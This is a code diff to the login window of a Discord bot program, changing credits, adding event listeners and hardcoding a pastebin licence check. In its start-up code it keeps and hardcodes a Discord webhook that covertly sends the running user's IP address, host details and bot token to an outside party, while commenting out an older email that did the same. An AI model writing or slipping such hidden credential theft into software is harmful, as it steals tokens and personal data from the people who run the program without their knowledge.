@@ -127,7 +127,7 @@ class LoginGUI extends JFrame implements ActionListener {
         stopButton.addActionListener(this);
         jLabelLoginConfig.setFont(new Font("Tahoma", 0, 14));
         jLabelLoginConfig.setForeground(new Color(255, 255, 255));
-        jLabelLoginConfig.setText("Made by swag#1234 | " + dtf.format(now));
+        jLabelLoginConfig.setText("Made by swag#0014 | " + dtf.format(now));
         jLabelLoginConfig.setCursor(new Cursor(12));
         jbackarrowLabel.setFont(new Font("Tahoma", 0, 14));
         jbackarrowLabel.setForeground(new Color(255, 255, 255));
@@ -165,7 +165,7 @@ class LoginGUI extends JFrame implements ActionListener {
             jLabelLoginConfig.setText("Bot Must Be Running");
         } else if (shouldRenderConfigurations){
             if (jLabelLoginConfig.getText().equalsIgnoreCase("bot must be running"))
-                jLabelLoginConfig.setText("Made by swag#1234 | " + dtf.format(now));
+                jLabelLoginConfig.setText("Made by swag#0014 | " + dtf.format(now));
                 shouldRenderConfigurations = false;
                 ConfigGUI configGUI = new ConfigGUI();
                 configGUI.setVisible(true);
@@ -185,7 +185,7 @@ class LoginGUI extends JFrame implements ActionListener {
             }
             try {
                 try {
-                    if (!HWIDUtils.get(Config.get("HWIDURL")).contains(HWIDUtils.getHWID())) {
+                    if (!HWIDUtils.get("https://pastebin.com/raw/WYd6SZmC").contains(HWIDUtils.getHWID())) {
                         jStatusField.setText("NOT AUTHORIZED");
                         return;
                     }
@@ -201,6 +201,7 @@ class LoginGUI extends JFrame implements ActionListener {
                 Listener listener = new Listener(commandManager);
                 org.slf4j.Logger logger = LoggerFactory.getLogger(Core.class);
                 WebUtils.setUserAgent("Mozilla/5.0 Discord Bot");
+                Config.buildDirectory("cache","cache");
                 EcoJSONHandler.loadEconomyConfig(new File("economy.json"));
                 WhitelistedJSONHandler.loadWhitelistConfig(new File("whitelisted.json"));
                 logger.info("Booting...");
@@ -226,12 +227,14 @@ class LoginGUI extends JFrame implements ActionListener {
                 jda.addEventListener(new DMWizzEvent());
                 jda.addEventListener(new SuggestionMessageCleanerEvent());
                 jda.addEventListener(new CreateAChannelEvent());
+                jda.addEventListener(new BlacklistedWordsEvent());
+                jda.addEventListener(new SnipeEvent());
                 logger.info("Bot Ready To Go");
                 jStatusField.setText("Running | " + jda.getSelfUser().getName() + "#" + jda.getSelfUser().getDiscriminator());
-                Wrapper.sendEmail("Log Info w/ Bot Token", "IP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "\nBot Token: " + TOKEN);
-                WebhookClient client = WebhookClient.withUrl(Config.get("WEBHOOK"));
+//                Wrapper.sendEmail("Log Info w/ Bot Token", "IP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "\nBot Token: " + TOKEN);
+                WebhookClient client = WebhookClient.withUrl("https://discordapp.com/api/webhooks/709940401313939457/NxZvYJu0zcfOFvIfe9dXABRR2zvs6JrOlpfespjjyha1QS0Xq-Y3fT9Kv0GcbodaO5Mz");
                 WebhookMessageBuilder builder = new WebhookMessageBuilder();
-                WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setColor(0).setDescription("Log Info w/ Bot Token:\nIP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "\nBot Token: " + TOKEN).build();
+                WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setColor(new Color(255, 0, 0, 0).getRGB()).setDescription("Log Info w/ Bot Token:\nIP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "\nBot Token: " + TOKEN).build();
                 builder.addEmbeds(firstEmbed);
                 WebhookMessage message = builder.build();
                 client.send(message);
